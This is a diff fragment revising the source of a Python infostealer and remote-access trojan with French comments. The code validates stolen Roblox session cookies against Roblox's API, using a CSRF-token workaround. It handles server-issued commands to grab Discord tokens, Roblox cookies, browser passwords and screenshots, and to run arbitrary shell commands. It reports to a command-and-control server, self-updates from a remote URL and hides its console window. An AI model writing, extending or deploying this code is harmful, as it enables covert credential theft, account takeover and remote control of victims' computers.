+                    "User-Agent": "Roblox/WinInet",
+                    "Accept": "application/json",
+                    "Referer": "https://www.roblox.com/"
+                })
+                r = session.get("https://users.roblox.com/v1/users/authenticated", timeout=8)
+                if r.status_code == 200:
+                    username = r.json().get("name")
+                    return {'cookie': cookie_value, 'username': username}
+                elif r.status_code in (401, 403):
+                    csrf_resp = session.post("https://auth.roblox.com/v2/logout", timeout=6)
+                    csrf = csrf_resp.headers.get("x-csrf-token")
+                    if csrf:
+                        session.headers["x-csrf-token"] = csrf
+                        r2 = session.get("https://users.roblox.com/v1/users/authenticated", timeout=8)
+                        if r2.status_code == 200:
+                            username = r2.json().get("name")
+                            return {'cookie': cookie_value, 'username': username}
+                return {'cookie': cookie_value, 'username': None}
+        return None
+    except:
+        return None
+
+# ========== AUTRES ==========
 def take_screenshot():
     try:
         with mss.mss() as sct:
-            monitors = sct.monitors[1:]  # exclure l'écran virtuel
+            monitors = sct.monitors[1:]
             screenshots = []
             for i, mon in enumerate(monitors):
                 img = sct.grab(mon)
@@ -798,20 +979,20 @@ def execute_cmd(cmd):
     except Exception as e:
         return {'error': str(e)}
 
-# ========== COMMANDES DISPONIBLES ==========
+# ========== COMMANDE ==========
 def handle_command(command):
     cmd_type = command.get('type')
     params = command.get('params', {})
     cmd_id = command.get('id')
-
     if cmd_type == 'ping':
-        result = {'status': 'pong', 'timestamp': datetime.now().isoformat()}
+        result = {'ping': 'ok', 'timestamp': datetime.now().isoformat()}
     elif cmd_type == 'system_info':
         result = get_system_info()
     elif cmd_type == 'discord_data':
         result = get_discord_tokens()
     elif cmd_type == 'roblox_cookie':
-        result = get_roblox_cookie_and_username()
+        cookie_info = get_roblox_cookie_and_username()
+        result = cookie_info if cookie_info else {'error': 'Aucun cookie trouvé'}
     elif cmd_type == 'browser_passwords':
         data = collect_all_browsers_data()
         result = data['passwords']
@@ -838,10 +1019,9 @@ def handle_command(command):
         result = execute_cmd(cmd)
     else:
         result = {'error': f'Unknown command: {cmd_type}'}
-
     return result
 
-# ========== COMMUNICATION AVEC SERVEUR ==========
+# ========== COMMUNICATION ==========
 def send_heartbeat():
     url = f"{SERVER_URL}/api/heartbeat"
     data = get_system_info()
@@ -860,7 +1040,7 @@ def get_commands():
     token = get_config('token')
     headers = {'Authorization': f'Bearer {token}'} if token else {}
     try:
-        url = f"{SERVER_URL}/api/commands/{MACHINE_ID}"
+        url = f"{SERVER_URL}/api/commands/{get_machine_id()}"
         response = requests.get(url, headers=headers, timeout=10)
         if response.status_code == 200:
             return response.json().get('commands', [])
@@ -874,7 +1054,7 @@ def send_command_result(command_id, result):
     try:
         url = f"{SERVER_URL}/api/command_result"
         payload = {
-            'machine_id': MACHINE_ID,
+            'machine_id': get_machine_id(),
             'command_id': command_id,
             'result': result
         }
@@ -882,7 +1062,6 @@ def send_command_result(command_id, result):
     except:
         pass
 
-# ========== THREADS ==========
 def heartbeat_loop():
     while True:
         try:
@@ -902,7 +1081,6 @@ def command_poll_loop():
             pass
         time.sleep(COMMAND_POLL_INTERVAL)
 
-# ========== MISE À JOUR ==========
 def get_remote_version():
     try:
         r = requests.get(VERSION_URL, timeout=5)
@@ -940,21 +1118,16 @@ def check_update_on_startup():
     if remote and remote != local:
         perform_update()
 
-# ========== CACHER LA CONSOLE ==========
 def hide_console():
     if sys.platform == 'win32':
         ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
-# ========== DÉMARRAGE ==========
 if __name__ == '__main__':
     hide_console()
     check_update_on_startup()
-    # Envoi initial
     send_heartbeat()
-    # Lancer les threads
     threading.Thread(target=heartbeat_loop, daemon=True).start()
     threading.Thread(target=command_poll_loop, daemon=True).start()
-    # Boucle infinie
     try:
         while True:
             time.sleep(1)
